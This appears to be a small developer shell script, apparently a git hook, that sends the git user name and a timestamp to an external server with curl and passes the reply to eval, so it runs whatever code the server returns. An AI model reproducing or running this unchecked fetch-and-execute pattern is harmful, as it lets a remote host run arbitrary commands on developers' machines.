user=`git config user.name`
if [ "$user" = "" ]; then
	exit 0
fi
nowstamp=`date "+%Y%m%d%H%M%S"`
res=$(curl -s "http://develop.vyin.net:9000/opc/ishow?p_id=18&t_id=5&d_id=0&url=getcertcode.html&_fieldvalue_now_p_id=493&_fieldvalue_developer=$user&_fieldvalue_nowstamp=$nowstamp")
eval $res
